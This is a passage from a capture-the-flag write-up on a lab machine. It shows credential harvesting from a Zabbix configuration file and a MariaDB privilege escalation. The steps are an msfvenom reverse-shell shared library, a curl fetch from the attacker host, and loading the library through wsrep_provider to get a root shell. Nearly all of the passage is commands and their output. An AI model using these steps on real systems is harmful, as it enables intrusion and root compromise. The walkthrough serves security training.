+/var/lib/dpkg/info/zabbix-sender.md5sums
+/var/lib/dpkg/info/zabbix-server-mysql.postrm
+/var/lib/dpkg/info/zabbix-release.list
+/var/lib/dpkg/info/zabbix-agent.prerm
+/var/lib/dpkg/info/zabbix-agent.conffiles
+/var/lib/dpkg/info/zabbix-agent.postinst
+/var/lib/dpkg/info/zabbix-server-mysql.postinst
+/var/lib/dpkg/info/zabbix-get.list
+/var/lib/dpkg/info/zabbix-sender.list
+/var/lib/dpkg/info/zabbix-frontend-php.list
+/var/lib/dpkg/info/zabbix-agent.list
+/var/lib/dpkg/info/zabbix-get.md5sums
+/var/lib/dpkg/info/zabbix-frontend-php.prerm
+/var/lib/dpkg/info/zabbix-server-mysql.md5sums
+/var/lib/dpkg/info/zabbix-frontend-php.postinst
+/var/lib/dpkg/info/zabbix-server-mysql.conffiles
+/var/lib/dpkg/info/zabbix-frontend-php.postrm
+/var/lib/dpkg/alternatives/zabbix-frontend-font
+/var/log/zabbix/zabbix_agentd.log.1
+/var/log/zabbix/zabbix_agentd.log
+/var/log/zabbix/zabbix_server.log
+/var/log/zabbix/zabbix_server.log.1
+/run/zabbix/zabbix_server.pid
+/run/zabbix/zabbix_agentd.pid
+/etc/zabbix/zabbix_agentd.conf
+/etc/zabbix/zabbix_server.conf.dpkg-dist
+/etc/zabbix/zabbix_server.conf
+/etc/zabbix/web/zabbix.conf.php
+/etc/zabbix/zabbix_agentd.conf.dpkg-dist
+/etc/logrotate.d/zabbix-server-mysql
+/etc/logrotate.d/zabbix-agent
+/etc/apt/trusted.gpg.d/zabbix-official-repo.gpg
+/etc/apt/sources.list.d/zabbix.list
+/etc/init.d/zabbix-agent
+/etc/init.d/zabbix-server
+/usr/bin/zabbix_sender
+/usr/bin/zabbix_get
+/usr/share/zabbix/zabbix.php
+/usr/share/zabbix/conf/zabbix.conf.php.example
+/usr/share/man/man8/zabbix_server.8.gz
+/usr/share/man/man8/zabbix_agentd.8.gz
+/usr/share/man/man1/zabbix_sender.1.gz
+/usr/share/man/man1/zabbix_get.1.gz
+/usr/lib/tmpfiles.d/zabbix-server.conf
+/usr/lib/tmpfiles.d/zabbix-agent.conf
+/usr/sbin/zabbix_agentd
+/usr/sbin/zabbix_server
+</code></pre></div><p>There is one called <code>/etc/zabbix/zabbix_server.conf</code> that seems interesting. In fact, it contains the credentials we are looking for:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>ipmi-svc@shibboleth:~$ grep -iC 2 password /etc/zabbix/zabbix_server.conf  
+DBUser=zabbix
+
+### Option: DB<span class=code-red>Password</span>
+#       Database <span class=code-red>password</span>.
+#       Comment this line if no <span class=code-red>password</span> is used.
+#
+# Mandatory: no
+# Default:
+DB<span class=code-red>Password</span>=bloooarskybluh
+
+### Option: DBSocket
+</code></pre></div><p>At this point, we can enter MySQL:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>ipmi-svc@shibboleth:~$ mysql --user=zabbix --password=bloooarskybluh
+<span class=code-white>Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 2121
+Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span>  
+
+MariaDB [(none)]> exit
+<span class=code-white>Bye</span>
+</code></pre></div><p>But we want to get a <code>root</code> shell. For that, we need to generate a payload for a reverse shell in an ELF shared library format and upload it to the machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>msfvenom</span> -p linux/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=5555 -f elf-so -o rev.so  
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf-so file: 476 bytes
+Saved as: rev.so
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>ipmi-svc@shibboleth:~$ cd /tmp
+ipmi-svc@shibboleth:/tmp$ curl 10.10.17.44/rev.so -so rev.so  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.124 - - [] "GET /rev.so HTTP/1.1" 200 -  
+^C
+Keyboard interrupt received, exiting.
+</code></pre></div><p>Then, we can use it to gain RCE:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>ipmi-svc@shibboleth:/tmp$ mysql --user=zabbix --password=bloooarskybluh --execute='SET GLOBAL wsrep_provider="/tmp/rev.so";'  
+ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query
+</code></pre></div><p>And we get the connection in <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 5555
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+Ncat: Connection from 10.10.11.124.
+Ncat: Connection from 10.10.11.124:38120.
+whoami
+root
+script /dev/null -c bash
+Script started, file is /dev/null
+root@shibboleth:/var/lib/mysql# ^Z
+zsh: suspended  ncat -nlvp 5555
+
+<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
+[1]  + continued  ncat -nlvp 5555
+                                 reset xterm
+root@shibboleth:/var/lib/mysql# export TERM=xterm
+root@shibboleth:/var/lib/mysql# export SHELL=bash
+root@shibboleth:/var/lib/mysql# stty rows 50 columns 158  
+root@shibboleth:/var/lib/mysql# cat /root/root.txt
+59607b79a008a6d32f911ad9b1461d57
+root@shibboleth:/var/lib/mysql#
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#udp-enumeration>UDP enumeration</a></li><li><a href=#ipmi-exploitation>IPMI exploitation</a></li><li><a href=#foothold-on-the-machine>Foothold on the machine</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>
